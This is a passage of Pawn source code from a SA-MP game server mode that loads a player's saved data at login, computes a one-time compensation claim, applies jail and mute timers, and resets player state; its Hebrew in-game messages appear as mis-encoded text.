				for(new i = 0; i < 8 && !flag; i++)
				{
					ReadUserInt_Loop("PlayerAmmo%d",playerinfo[playerid][ammo][i],i);
				}
			}
			else if(PartOfLoop("Rank"))
			{
				for(new i = 0; i < MAX_RANKS && !flag; i++)
				{
					ReadUserInt_Loop("Rank%02d",playerinfo[playerid][rank][i],i);
				}
			}
			else if(PartOfLoop("WType"))
			{
				for(new i = 0; i < max_wtypes && !flag; i++)
				{
					ReadUserInt_Loop("WType%d",playerinfo[playerid][wtype][i],i);
				}
			}
			else if(PartOfLoop("Friend_"))
			{
				for(new i = 1; i <= MAX_FRIENDS && !flag; i++)
				{
					format(string2,sizeof(string2),"Friend_%d",i);
					if(equal(key,string2))
					{
						SetPVarString(playerid,string2,flinevalue(string));
						if(!equal(flinevalue(string),"None")) playerinfo[playerid][friends]++;
					}
				}
			}
			else if(PartOfLoop("NoCMDEx"))
			{
				for(new i = 1; i <= 10 && !flag; i++)
				{
					format(string2,sizeof(string2),"NoCMDEx%d",i);
					if(equal(key,string2))
					{
						SetPVarString(playerid,string2,flinevalue(string));
						sett[i-1] = 1;
					}
				}
			}
			else if(PartOfLoop("NoCMD"))
			{
				for(new i = 1; i <= 10 && !flag; i++)
				{
					format(string2,sizeof(string2),"NoCMD%d",i);
					if(equal(key,string2))
					{
						SetPVarString(playerid,string2,flinevalue(string));
						sett2[i-1] = 1;
					}
				}
			}
			else if(PartOfLoop("WKills"))
			{
				for(new i = 0; i < 40 && !flag; i++)
				{
					ReadUserInt_Loop("WKills%d",playerinfo[playerid][wkills][i],i);
				}
			}
			else if(PartOfLoop("AmmuItem"))
			{
				for(new i = 0; i < max_ammunation_items && !flag; i++)
				{
					ReadUserInt_Loop("AmmuItem%d",playerinfo[playerid][ammuitemammo][AmmunationSpecialItems[i][aiID]],AmmunationSpecialItems[i][aiID]);
				}
			}
			else if(PartOfLoop("Objective"))
			{
				for(new i = 0; i < MAX_OBJECTIVES && !flag; i++)
				{
					ReadUserBool_Loop("Objective%d",playerinfo[playerid][objective][i],Objectives[i][obUniqueID]);
				}
			}
			else if(PartOfLoop("DiaryLine"))
			{
				for(new i = 1; i <= MAX_DIARY_LINES && !flag; i++)
				{
					AddUserStringAsPVar_Loop("DiaryLine%d",i);
				}
			}
			else if(PartOfLoop("AdminToggle"))
			{
				for(new i = 0; i < max_atoggles; i++)
				{
					ReadUserBool_Loop("AdminToggle%d",playerinfo[playerid][atoggle][i],AdminToggleType[i][atUID]);
				}
			}
			else if(PartOfLoop("Act_"))
			{
				for(new i = 0; i < sizeof(ActivityIDs); i++)
				{
					if(ActivityIDs[i][aidIsCategory])
					{
						for(new j = 0, m = act_GetCategoryMax(i); j < m; j++)
						{
							ReadUserActivity_Loop(act_Code(i,j));
						}
					}
					else
					{
						ReadUserActivity_Loop(act_Code(i));
					}
				}
			}
		}
	}
	fclose(fh);
	dbg(31,"3");
	#undef ReadUserString
	#undef ReadUserInt
	#undef ReadUserFloat
	#undef ReadUserString_Formatted
	#undef ReadUserInt_Loop
	#undef ReadUserBool_Loop
	#undef AddUserStringAsPVar_Loop
	#undef PartOfLoop
	if(claim) // цщыхщ юфюху фўхуэ ьт°ёф фчу∙ф
	{
	    #define claimlog(%1,%2) total += %1, format(fo,sizeof(fo),"\nцщыхщ Єь %s: $%d",%2,%1), strcat(output, fo)
	    new total, output[M_S_D], fo[128], File:fop;
		if(playerinfo[playerid][upower] != -1)
		{
			switch(playerinfo[playerid][upower])
			{
				case 0: claimlog(4000000, "ыхч рхьшщюшщсщ юёхт руюф");
				case 1: claimlog(5000000, "ыхч рхьшщюшщсщ юёхт р∙");
				case 2: claimlog(4000000, "ыхч рхьшщюшщсщ юёхт рххщ°");
				case 3: claimlog(1000000, "ыхч рхьшщюшщсщ юёхт ющэ");
			}
			fsetint(f,"PlayerUPower",playerinfo[playerid][upower] = -1);
		}
		if(playerinfo[playerid][upower2] != -1)
		{
			switch(playerinfo[playerid][upower2])
			{
				case 0: claimlog(4000000, "ыхч рхьшщюшщсщ ∙Ёщ юёхт руюф");
				case 1: claimlog(5000000, "ыхч рхьшщюшщсщ ∙Ёщ юёхт р∙");
				case 2: claimlog(4000000, "ыхч рхьшщюшщсщ ∙Ёщ юёхт рххщ°");
				case 3: claimlog(1000000, "ыхч рхьшщюшщсщ ∙Ёщ юёхт ющэ");
			}
			fsetint(f,"PlayerUPower2",playerinfo[playerid][upower2] = -1);
		}
		if(playerinfo[playerid][bank] > 0)
		{
			claimlog(playerinfo[playerid][bank],"ыёє юфсЁў");
			fsetint(f,"Bank",playerinfo[playerid][bank] = 0);
		}
		if(playerinfo[playerid][ccard]) claimlog(200000, "ы°шщё р∙°рщ"), fsetint(f,"CCard",playerinfo[playerid][ccard] = 0);
		if(playerinfo[playerid][vehicle][0])
		{
			claimlog(fgetint(f, "VehicleCost"), "°ыс °р∙хя");
			fsetint(f, "PVehicle", playerinfo[playerid][vehicle][0] = 0);
			playerinfo[playerid][vehicle][2] = 0;
			for(new i = 0; i <= 13; i++)
			{
				playerinfo[playerid][pvmod][i] = 0;
				format(string,sizeof(string),"VehicleMod%d",i);
				if(fkeyexist(fuser(playerid),string)) fremovekey(fuser(playerid),string);
			}
		}
		if(playerinfo[playerid][vehicle][3])
		{
			claimlog(fgetint(f, "Vehicle2Cost"), "°ыс ∙Ёщ");
			fsetint(f, "PVehicle2", playerinfo[playerid][vehicle][3] = 0);
			playerinfo[playerid][vehicle][4] = 0;
		}
        if(playerinfo[playerid][vehicle][5])
		{
			claimlog(fgetint(f, "Vehicle3Cost"), "°ыс ∙ьщ∙щ хющхчу");
			fsetint(f, "PVehicle3", playerinfo[playerid][vehicle][5] = 0);
			playerinfo[playerid][vehicle][6] = 0;
		}
		if(playerinfo[playerid][pet][0])
		{
			switch(playerinfo[playerid][pet][0])
			{
				case 1: claimlog(30000, "чщщ· ючюу: ут");
				case 2: claimlog(50000, "чщщ· ючюу: юухцф");
				case 3: claimlog(60000, "чщщ· ючюу: юухцф рухюф");
				case 4: claimlog(100000, "чщщ· ючюу: Ўс");
				case 5: claimlog(200000, "чщщ· ючюу: ухьЇщя");
				case 6: claimlog(250000, "чщщ· ючюу: ·хыщ");
				case 7: claimlog(350000, "чщщ· ючюу: Ўсщ");
				case 8: claimlog(350000, "чщщ· ючюу: Ї°ф");
				case 9: claimlog(500000, "чщщ· ючюу: ы°щ∙");
			}
			fsetint(f, "Pet", playerinfo[playerid][pet][0] = 0);
		}
		if(playerinfo[playerid][lastmoney]) claimlog(playerinfo[playerid][lastmoney], "ыёє ∙юх°"), fsetint(f, "LastMoney", playerinfo[playerid][lastmoney] = 0);
		if(playerinfo[playerid][phone] != -1)
		{
		    switch(playerinfo[playerid][phone])
		    {
		        case 0: claimlog(20000, "ЇьрЇхя ух° °р∙хя");
		        case 1: claimlog(150000, "ЇьрЇхя ух° ∙Ёщ");
		        case 2: claimlog(350000, "ЇьрЇхя ух° ∙ьщ∙щ");
		    }
		    fsetint(f, "Phone", playerinfo[playerid][phone] = -1);
		}
		new w[10], wammo[10], wcount;
		for(new x; x < 10; x++)
		{
		    format(string, sizeof(string), "PlayerWeapon%d", x);
			w[x] = fgetint(f, string);
			fsetint(f, string, 0);
			format(string, sizeof(string), "PlayerAmmo%d", x);
			wammo[x] = fgetint(f, string);
			fsetint(f, string, 0);
			ResetWeapons(playerid);
			playerinfo[playerid][weapons][x] = 0;
			if(x < 8) playerinfo[playerid][ammo][x] = 0;
		}
		if(wammo[0]) switch(w[0])
		{
		    case 22: wcount += ((wammo[0] / 100) * 1000);
		    case 23: wcount += ((wammo[0] / 50) * 1500);
		    case 24: wcount += ((wammo[0] / 50) * 3000);
		}
		if(wammo[1]) switch(w[1])
		{
		    case 25: wcount += ((wammo[1] / 50) * 5000);
			case 26: wcount += ((wammo[1] / 50) * 4000);
			case 27: wcount += ((wammo[1] / 50) * 2500);
		}
		if(wammo[2]) switch(w[2])
		{
		    case 28: wcount += ((wammo[2] / 100) * 2500);
		    case 29: wcount += ((wammo[2] / 100) * 2500);
		    case 32: wcount += ((wammo[2] / 50) * 3000);
		}
		if(wammo[3]) switch(w[3])
		{
		    case 30: wcount += ((wammo[3] / 100) * 4500);
		    case 31: wcount += ((wammo[3] / 100) * 5000);
		}
		if(wammo[4]) switch(w[4])
		{
		    case 33: wcount += ((wammo[4] / 10) * 4000);
		    case 34: wcount += ((wammo[4] / 10) * 8000);
		}
		if(wammo[5]) switch(w[5])
		{
		    case 16: wcount += (wammo[5] * 8000);
		    case 17: wcount += (wammo[5] * 8000);
		    case 18: wcount += (wammo[5] * 3000);
			case 39: wcount += (wammo[5] * 12000);
		}
		if(wammo[6]) switch(w[6])
		{
		    case 35, 36: wcount += (wammo[6] * 200000);
		    case 37: wcount += ((wammo[6] / 25) * 12000);
		}
		if(wammo[7]) switch(w[7])
		{
			case 41: wcount += (wammo[7] * 250);
			case 42: wcount += (wammo[7] * 500);
		}
		if(wammo[8]) wcount += 8000;
		if(wammo[9]) switch(w[9])
		{
			case 4: wcount += 12000;
			case 5: wcount += 10000;
			case 8: wcount += 12000;
			case 9: wcount += 15000;
		}
		claimlog(wcount, "Ё∙ўщэ");
		#undef claimlog
		claim = floatround(floatmul(float(total),0.015), floatround_ceil);
		format(fo, sizeof(fo), "\n\n .∙ххщ фю∙·ю∙ фўхуэ ∙ьъ фтщЄ ьёыхэ ∙ь %d$. ю·хыэ, ·цыф ьўсь %d$.", total, claim);
		strcat(output, fo);
		format(fo,sizeof(fo),folder_infoco "%s.txt",GetName(playerid));
		fop = fopen(fo,io_write);
		if(fop)
		{
			fwrite(fop,output);
			fclose(fop);
		}
		fsetint(f,"Claim",claim);
		SendClientMessage(playerid,green," /rewards :ЁюЎр ыщ р·ф цырщ ьўсь ёыхэ ыёє юфю∙·ю∙ ∙ьъ ют°ё· фюху фўхую·! ьЇ°шщэ");
		format(fo, sizeof(fo), "first login, reward: %d", claim);
		Log("Claim", playerid, fo);
	}
	dbg(31,"4");
	if(!strlen(playerinfo[playerid][secretword])) ShowPlayerConstDialog(playerid,dialog_secretword,2);
    if(!playerinfo[playerid][iplogin])
	{
		new lastuid[40];
		format(lastuid,sizeof(lastuid),fgetstring(fuser(playerid),"LastUID"));
		if(!equal(GetSerial(playerid),lastuid) && playerid != ConsoleID)
		{
		    if(!equal(fgetstring(fuser(playerid),"LastConnectIP"),GetIP(playerid)))
		    {
				playerinfo[playerid][security] = 0;
  				playerinfo[playerid][failedword] = 0;
				SendClientMessage(playerid,red,"юЎрЁх ыщ фю∙·ю∙ ∙рьщх ф·чс°· рхьщ ьр ∙ьъ. рЁр сЎЄ р· ффх°рх· фсрх· с∙сщь ь∙чў сю∙·ю∙ цф");
				SendClientMessage(playerid,red,"с∙сщь ьфцуфх· Єэ фющьф фёхущ· ∙ьъ, с∙сщь ∙Ёрю· ∙фю∙·ю∙ срю· ∙ьъ /auth ф∙·ю∙ сЇўхуф");
			}
		}
 	}
 	if(!playerinfo[playerid][iplogin])
	{
		new lastuid[40];
		format(lastuid,sizeof(lastuid),fgetstring(fuser(playerid),"LastUID"));
		if(!equal(GetSerial(playerid),lastuid) && playerid != ConsoleID)
		{
		    if(!equal(fgetstring(fuser(playerid),"LastConnectIP"),GetIP(playerid)))
		    {
				playerinfo[playerid][security] = 0;
  				playerinfo[playerid][failedword] = 0;
				SendClientMessage(playerid,red,"юЎрЁх ыщ фю∙·ю∙ ∙рьщх ф·чс°· рхьщ ьр ∙ьъ. рЁр сЎЄ р· ффх°рх· фсрх· с∙сщь ь∙чў сю∙·ю∙ цф");
				SendClientMessage(playerid,red,"с∙сщь ьфцуфх· Єэ фющьф фёхущ· ∙ьъ, с∙сщь ∙Ёрю· ∙фю∙·ю∙ срю· ∙ьъ /auth ф∙·ю∙ сЇўхуф");
			}
		}
 	}
	dbg(31,"5");
 	/*if(fgetint(fuser(playerid),"PlayerHouse") > 0)
	{
	    fsetint(fuser(playerid),"PlayerHouse",-1);
	    playerinfo[playerid][house] = -1;
		SendClientMessage(playerid,green," .стьь рщЇхё фс·щэ с∙°·, ўщсь· фчц° сёъ 750,000$");
		if((playerinfo[playerid][bank] + 750000 > levels[playerinfo[playerid][level]][BankLimit]) && levels[playerinfo[playerid][level]][BankLimit] != 0)
		{
		    SendClientMessage(playerid,red,".юыщххя ∙рэ фёыхэ щ·ххёє ьсЁў ∙ьъ, ·Єсх° р· ффтсьф фёыхэ Ё∙ьч рьщъ");
		    SendClientMessage(playerid,red,"!фЁфь· фўфщьф ьр рч°рщ· Єь юў°щэ сх ф°тх рх·ъ Єэ фыёє");
		    GiveMoney(playerid,750000, -1);
		    Log("Money", playerid, "earned 750000 (house reset)");
		}
		else
		{
			playerinfo[playerid][bank] += 750000;
			SendClientMessage(playerid,red,".фёыхэ фхЄс° срхЇя рхшхюшщ ьч∙схя фсЁў ∙ьъ");
			fsetint(fuser(playerid),"Bank",playerinfo[playerid][bank]);
			Log("Money", playerid, "earned 750000 (house reset)");
		}
	}*/
	if(playerinfo[playerid][level] == -1)
	{
		for(new i = 1; i < sizeof(levels); i++) if(playerinfo[playerid][kills] >= levels[i][NeedKills]) playerinfo[playerid][level] = i;
		fsetint(f,"PlayerLevel",playerinfo[playerid][level]);
	}
	if(!fkeyexist(f,"BankPassword")) fsetstring(f,"BankPassword","None");
	if(playerinfo[playerid][bank] > levels[playerinfo[playerid][level]][BankLimit] && levels[playerinfo[playerid][level]][BankLimit] > 0)
	{
		playerinfo[playerid][bank] = levels[playerinfo[playerid][level]][BankLimit];
		fsetint(f,"Bank",levels[playerinfo[playerid][level]][BankLimit]);
	}
	dbg(31,"5b");
	format(string,sizeof(string),GetName(playerid));
	playerinfo[playerid][vip] = fkeyexist(file_vip,string) ? fgetint(file_vip,string) : 0;
	if(playerinfo[playerid][lastmoney])
	{
		format(string,sizeof(string)," .ыёЇъ Ё∙ю° юыщххя ∙ф∙°· ЁЇь / ўщсь· ўщў / ўщсь· ў°р∙ сцюя ∙∙щчў· сх: %d$",playerinfo[playerid][lastmoney]);
		SendClientMessage(playerid,green,string);
		GiveMoney(playerid,playerinfo[playerid][lastmoney], 46);
		playerinfo[playerid][lastmoney] = 0;
		fsetint(fuser(playerid),"LastMoney",0);
	}
	if(playerinfo[playerid][house] != -1) playerinfo[playerid][houseacc][playerinfo[playerid][house]] = 1;
	dbg(31,"5c");
	if(playerinfo[playerid][mark][0] != 0.0)
	{
		playerinfo[playerid][mark][0] = fgetfloat(f,"SavedX");
		playerinfo[playerid][mark][1] = fgetfloat(f,"SavedY");
		playerinfo[playerid][mark][2] = fgetfloat(f,"SavedZ");
		playerinfo[playerid][mark2][0] = 0;
		playerinfo[playerid][mark2][1] = world_normal;
		playerinfo[playerid][mark2][2] = 1;
		SetPlayerMapIcon(playerid,icon_player,playerinfo[playerid][mark][0],playerinfo[playerid][mark][1],playerinfo[playerid][mark][2],35,0);
	}
	if(playerinfo[playerid][spweapon] != spw_none && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] > 0) DefineSPWGun(playerid,playerinfo[playerid][spweapon],1);
	if(strlen(clanc) > 0)
	{
		if(clanc[0] == '0') playerinfo[playerid][clan] = 0;
		else
		{
			new clanc_n[32], clanc_i[32];
			strmid(clanc_n,clanc,0,strfind(clanc,"/"));
			strmid(clanc_i,clanc,strfind(clanc,"/")+1,strlen(clanc));
			if(strval(clanc_i) <= 0 || strval(clanc_i) > MAX_CLANS || !claninfo[strval(clanc_i)][cvalid] || !clannumber(clanc_n))
			{
				fsetint(f,"ClanCode",0);
				playerinfo[playerid][clan] = 0;
			}
			else playerinfo[playerid][clan] = strval(clanc_i);
		}
	}
	dbg(31,"5d");
	if(playerinfo[playerid][clan] > 0)
	{
		claninfo[playerinfo[playerid][clan]][cplayers][claninfo[playerinfo[playerid][clan]][cmembers]++] = playerid;
		if(strlen(claninfo[playerinfo[playerid][clan]][cmessage]) > 1)
		{
			format(string,sizeof(string)," ╗ Clan Message: %s",claninfo[playerinfo[playerid][clan]][cmessage]);
			SendClientMessage(playerid,purple,string);
		}
	}
	if(equal(playerinfo[playerid][clantag],"X")) playerinfo[playerid][clantag][0] = 0;
	else format(playerinfo[playerid][clantag],16,fgetstring(f,"ClanTag"));
	if(playerinfo[playerid][org] <= 0 || playerinfo[playerid][org] > MAX_ORGS || !orginfo[playerinfo[playerid][org]][orgvalid])
	{
		if(playerinfo[playerid][org] != 0) fsetint(f,"Org",0);
		playerinfo[playerid][org] = 0;
	}
	if(equal(playerinfo[playerid][orgtag],"X")) playerinfo[playerid][orgtag][0] = 0;
	else format(playerinfo[playerid][orgtag],16,fgetstring(f,"OrgTag"));
	dbg(31,"5e");
	for(new i = 0; i < max_settings; i++) if(playerinfo[playerid][setting][i] == -1)
	{
		format(string,sizeof(string),"Setting%d",i);
		fsetint(f,string,Settings[i][stDefault]);
		playerinfo[playerid][setting][i] = Settings[i][stDefault];
	}
	SetPlayerFightingStyle(playerid,playerinfo[playerid][setting][setting_fs] == 1 ? 15 : playerinfo[playerid][setting][setting_fs] + 3);
	OnPlayerRequestClass(playerid,playerinfo[playerid][class]);
	playerinfo[playerid][propscount] = 0;
	dbg(31,"6");
	for(new i=0;i<props;i++)
	{
		format(string,sizeof(string),"/DM/Properties/%d.ini",i);
		if(equal(fgetstring(string,"Owner"),GetName(playerid)))
		{
			propinfo[i][owner] = playerid, playerinfo[playerid][propscount]++, playerinfo[playerid][earns][i] = fgetint(string,"LeftEarns"), playerinfo[playerid][propcost][i] = fgetint(string,"BoughtCost");
			if(playerinfo[playerid][propscount] == 1) SendClientMessage(playerid,lightblue," :фЁыёщэ фсрщэ фхчц°х рьщъ");
			format(string,sizeof(string)," Х %s (ю∙ых°х·: %d)",propinfo[i][pname],playerinfo[playerid][earns][i]);
			SendClientMessage(playerid,green,string);
		}
	}
	if(playerinfo[playerid][propscount] > 0)
	{
		format(string,sizeof(string)," !ёъ фыь %d Ёыёщэ фхчц°х ьъ",playerinfo[playerid][propscount]);
		SendClientMessage(playerid,lightblue,string);
	}
	if(d[1] == playerinfo[playerid][birthdate][1] && d[0] == playerinfo[playerid][birthdate][0])
	{
		if(PlayerDefinedName(playerid)) format(string,sizeof(string)," !!!юць шхс ь%s ьщхэ фхьу·х ф-%d",playerinfo[playerid][rname],d[2]-playerinfo[playerid][birthdate][2]);
		else format(string,sizeof(string)," !!!ьщхэ фхьу·х ф-%d %s-юць шхс ь",d[2]-playerinfo[playerid][birthdate][2],GetName(playerid));
		SendClientMessageToAll(orange,string);
	}
	if(DaysBetweenDates(fgetstring(f,"LastChangepass"),GetDateAsString()) > 0) fsetint(f,"ChangepassLimit",0);
	if(DaysBetweenDates(fgetstring(f,"LastChangename"),GetDateAsString()) > 0) fsetint(f,"ChangenameLimit",0);
	if(DaysBetweenDates(fgetstring(f,"LastABWithdraw"),GetDateAsString()) > 6) fsetint(f,"ABWithdrawLimit",0);
	SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
	if(equal(playerinfo[playerid][rname],"no")) SendClientMessage(playerid,white," /Profile :Єущщя ьр фту°· р· ∙юъ фЇ°шщ. рЁх ююьщЎщэ ьЄуыя");
	for(new i = 0; i < max_wtypes; i++) if(playerinfo[playerid][wtype][i] == -1)
	{
		format(string,sizeof(string),"WType%d",i);
		fsetint(f,string,WeaponTypes[i][wtWeapons][0]);
		playerinfo[playerid][wtype][i] = WeaponTypes[i][wtWeapons][0];
	}
	if(playerinfo[playerid][xjail] || playerinfo[playerid][jail][0] > 0)
	{
		SetPlayerPos(playerid,264.3591,77.5832,1001.0391);
		SetPlayerFacingAngle(playerid,270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,6);
		SetFreeze(playerid,1);
		if(playerinfo[playerid][jail][0] > 0)
		{
			SetTimerPck(playerinfo[playerid][jail][1],"UnJail",1000,1,"d",playerid);
			format(string,sizeof(string)," *** %s has been jailed for %d seconds by %s. (Ёщёщхя с°щчф юыьр)",GetName(playerid),playerinfo[playerid][jail][0],botname);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		}
	}
	if(playerinfo[playerid][mute][0] > 0)
	{
		SetTimerPck(playerinfo[playerid][mute][1],"UnMute",1000,1,"d",playerid);
		format(string,sizeof(string)," *** %s has been muted for %d seconds by %s. (Ёщёщхя с°щчф юющхш)",GetName(playerid),playerinfo[playerid][mute][0],botname);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
	}
	playerinfo[playerid][playerprize] = CallRemoteFunction("GetPlayerPrize","i",playerid);
	if(playerinfo[playerid][clothes] > -1 || playerinfo[playerid][clothes2] > -1) RefreshClothes(playerid);
	format(string,sizeof(string),"[login] level: %d, kills: %d, money: %d, bank: %d",playerinfo[playerid][level],playerinfo[playerid][kills],GetMoney(playerid),playerinfo[playerid][bank]);
	Log("Stats",playerid,string);
	format(f,sizeof(f),"/DM/Info/Last/LastInfo_%s.ini",GetName(playerid));
	if(fexist(f))
	{
		SendClientMessage(playerid,lightblue," ~~~ :щ∙Ёэ Ї°шщэ ∙чщых ьъ Єу ∙·ыЁё ыущ ∙·хыь ьўсь рх·э ~~~");
		for(new i = 1, m = 0, id = 0; i <= MAX_SAVED_DATA; i++)
		{
			format(string,sizeof(string),"GM%03dAmount",i);
			if(fkeyexist(f,string))
			{
				if(i == 1) SendClientMessage(playerid,lightblue," ~~~ :ыёє ~~~");
				id++;
				m = fgetint(f,string);
				GiveMoney(playerid,m, -1);
				format(string,sizeof(string)," :ыёє ∙ўщсь· (#%02d) - ўщсь· $%d юфёщсф фсрф",m,id);
				SendClientMessage(playerid,lightgreen,string);
				format(string,sizeof(string),"GM%03dText",i);
				SendClientMessage(playerid,lightgreen,fgetstring(f,string));
			}
		}
		for(new i = 1, id = 0; i <= MAX_SAVED_DATA; i++)
		{
			format(string,sizeof(string),"Msg%03dSender",i);
			format(string2,sizeof(string2),"Msg%03dText",i);
			if(fkeyexist(f,string) && fkeyexist(f,string2))
			{
				if(i == 1) SendClientMessage(playerid,lightblue," ~~~ :фхуЄх· ∙юх°х· ~~~");
				id++;
				format(string,sizeof(string),"(#%02d, %s) %s",id,fgetstring(f,string),fgetstring(f,string2));
				SendClientMessage(playerid,green,string);
			}
		}
		fremove(f);
	}
	for(new i = 1; i <= 10; i++)
	{
		format(string,sizeof(string),"NoCMD%d",i);
		if(!sett[i-1])
		{
			SetPVarString(playerid,string,"None");
			sett[i-1] = 1;
		}
		format(string,sizeof(string),"NoCMDEx%d",i);
		if(!sett2[i-1])
		{
			SetPVarString(playerid,string,"None");
			sett2[i-1] = 1;
		}
	}
	dbg(31,"7");
	for(new i = 0; i < max_ammunation_items; i++) playerinfo[playerid][ammuitems][AmmunationSpecialItems[i][aiID]] = playerinfo[playerid][ammuitemammo][AmmunationSpecialItems[i][aiID]] > 0;
	Border(playerid,"update");
	Border(playerid,"updatefriends");
	Border(playerid,"hidden");
	Border(playerid,"color");
	if(!strlen(playerinfo[playerid][secretword])) ShowPlayerConstDialog(playerid,dialog_secretword,2);
	dbg(31,"8");
	return 1;
}
//=[ResetInfo]==================================================================
stock ResetInfo(playerid,discon=0)
{
	dbg(100,"1");
	for(new i = 0; i < max_settings; i++) playerinfo[playerid][setting][i] = Settings[i][stDefault];
	if(playerinfo[playerid][vtele3] == 1) DestroyObject(playerinfo[playerid][vehicle][7]),playerinfo[playerid][vtele3] = 0;
    playerinfo[playerid][mstimenew] = 0;
	playerinfo[playerid][afk] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][startpos][i] = 0.0;
	#if aimbotcheck
	playerinfo[playerid][awarns] = 0;
	#endif
	format(playerinfo[playerid][secretword],MAX_SECURITY_WORD_LENGTH,"");
	playerinfo[playerid][spawned] = 0;
	playerinfo[playerid][alive] = 0;
	playerinfo[playerid][logged] = 0;
	playerinfo[playerid][finalwarning] = false;
	playerinfo[playerid][security] = 1;
	playerinfo[playerid][admin] = 0;
	playerinfo[playerid][admlog] = 0;
	playerinfo[playerid][faileds] = {0,0};
	playerinfo[playerid][logindia] = DIALOG_STYLE_PASSWORD;
	playerinfo[playerid][intime] = {0,0};
	for(new i=0;i<3;i++) playerinfo[playerid][color][i] = randomEx(5,250);
	dbg(100,"2");
	playerinfo[playerid][kills] = 0;
	if(discon && playerinfo[playerid][s0beitbantimer] != -1) KillTimer(playerinfo[playerid][s0beitbantimer]);
	playerinfo[playerid][s0beitbantimer] = -1;
	playerinfo[playerid][deaths] = 0;
	playerinfo[playerid][level] = 1;
	format(playerinfo[playerid][slevelname],64,"X");
	playerinfo[playerid][upower] = -1;
	playerinfo[playerid][charge] = -1;
	playerinfo[playerid][upower2] = -1;
	playerinfo[playerid][charge2] = -1;
	playerinfo[playerid][upower3] = {-1,-1};
	playerinfo[playerid][bank] = 0;
	playerinfo[playerid][ccard] = 0;
	playerinfo[playerid][mlpickup] = 0;
	playerinfo[playerid][bankshare] = 0;
	playerinfo[playerid][blockplayers] = false;
	playerinfo[playerid][naorslap] = false;
	playerinfo[playerid][weapons] = {0,0,0,0,0,0,0,0,0,0};
	playerinfo[playerid][ammo] = {0,0,0,0,0,0,0,0};
	playerinfo[playerid][vehicle][0] = 0;
	if(discon) if(playerinfo[playerid][vehicle][1] != -1) DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
	playerinfo[playerid][hacker] = false;
	playerinfo[playerid][firstspawn] = false;
	playerinfo[playerid][vehicle][1] = -1;
	playerinfo[playerid][vehicle][2] = 0;
	playerinfo[playerid][vehicle][3] = 0;
	playerinfo[playerid][vehicle][4] = 0;
	playerinfo[playerid][vehicle][5] = 0;
	playerinfo[playerid][vehicle][6] = 0;
	playerinfo[playerid][pvcol] = {0,0};
	playerinfo[playerid][pvpj] = 0;
	playerinfo[playerid][fuel] = -1;
	playerinfo[playerid][pvcol2] = {0,0};
	playerinfo[playerid][fuelr] = 0;
	playerinfo[playerid][fuelmax] = 30;
	playerinfo[playerid][houseid] = -1;
	for(new x; x < 20; x++) playerinfo[playerid][pvmod][x] = 0;
	playerinfo[playerid][vlistdia] = {-1,-1};
	playerinfo[playerid][viewingvehicle] = -1;
	playerinfo[playerid][skin] = -1;
	playerinfo[playerid][icq] = -1;
	format(playerinfo[playerid][messenger],30,"No");
	format(playerinfo[playerid][skype],30,"No");
	format(playerinfo[playerid][facebook],30,"No");
	format(playerinfo[playerid][email],30,"No");
	format(playerinfo[playerid][country],30,"No");
	format(playerinfo[playerid][rname],16,"No");
	playerinfo[playerid][birthdate] = {0,0,0};
	format(playerinfo[playerid][lastmetext],256," ");
	format(playerinfo[playerid][lasttext],M_S," ");
	format(playerinfo[playerid][lastpmtext],256," ");
	for(new i=0;i<11;i++) playerinfo[playerid][death][i] = 0;
	playerinfo[playerid][invisible] = 0;
	playerinfo[playerid][cp] = -1;
	playerinfo[playerid][incp] = 0;
	playerinfo[playerid][specp] = 0;
	dbg(100,"3");
	#if acmoney == 2
		playerinfo[playerid][money] = {0,0,0};
		playerinfo[playerid][moneywarns] = 0;
	#elseif acmoney == 1
		playerinfo[playerid][money] = {0,0};
	#endif
	playerinfo[playerid][propertyid] = -1;
	playerinfo[playerid][showprop] = 0;
	playerinfo[playerid][waitwar] = 0;
	playerinfo[playerid][inwar] = 0;
	playerinfo[playerid][warid] = 0;
	playerinfo[playerid][waitrace] = 0;
	playerinfo[playerid][inrace] = 0;
	playerinfo[playerid][racecp] = 0;
	playerinfo[playerid][raceid] = 0;
	playerinfo[playerid][racerecord] = {0,0,0};
	playerinfo[playerid][racetd] = INVALID_TEXT_DRAW;
	playerinfo[playerid][racemaxcp] = 0;
	playerinfo[playerid][waitwwe] = 0;
	playerinfo[playerid][inwwe] = 0;
	playerinfo[playerid][wweid] = 0;
	playerinfo[playerid][viewerwwe] = 0;
	playerinfo[playerid][work] = work_none;
	playerinfo[playerid][coplevel] = 0;
	playerinfo[playerid][doctorlevel] = 0;
	playerinfo[playerid][drivecost] = 0;
	playerinfo[playerid][killerlevel] = 0;
	playerinfo[playerid][icecreamcost] = 0;
	playerinfo[playerid][drugs] = 0;
	playerinfo[playerid][drugsp] = 0;
	playerinfo[playerid][drugscost] = 0;
	playerinfo[playerid][plotto] = -1;
	playerinfo[playerid][actbonus] = false;
	playerinfo[playerid][wolmul] = 0;
	playerinfo[playerid][lottoquestion] = -1;
	playerinfo[playerid][dmzone] = dmz_none;
	playerinfo[playerid][tdmzone] = tdmz_none;
	playerinfo[playerid][tdmclick] = {0,0,0};
	playerinfo[playerid][returntodm] = 0;
	playerinfo[playerid][dmzlevel] = 0;
	playerinfo[playerid][dmworld] = 1;
	dbg(100,"4");
	if(discon && playerinfo[playerid][pet][2])
	{
		if(playerinfo[playerid][pet][3]) StopPetAttacking(playerid);
		if(IsValidObject(playerinfo[playerid][pet][1])) DestroyObject(playerinfo[playerid][pet][1]);
	}
	for(new i=0;i<3;i++) if(i != 1) playerinfo[playerid][pet][i] = 0;
	if(discon && playerinfo[playerid][dinvited] != -1) playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1, playerinfo[playerid][dinvited] = -1;
	playerinfo[playerid][sgcomp] = -1;
	playerinfo[playerid][dinvited] = -1;
	playerinfo[playerid][dinviter] = 0;
	playerinfo[playerid][bet] = 0;
	playerinfo[playerid][indrift] = 0;
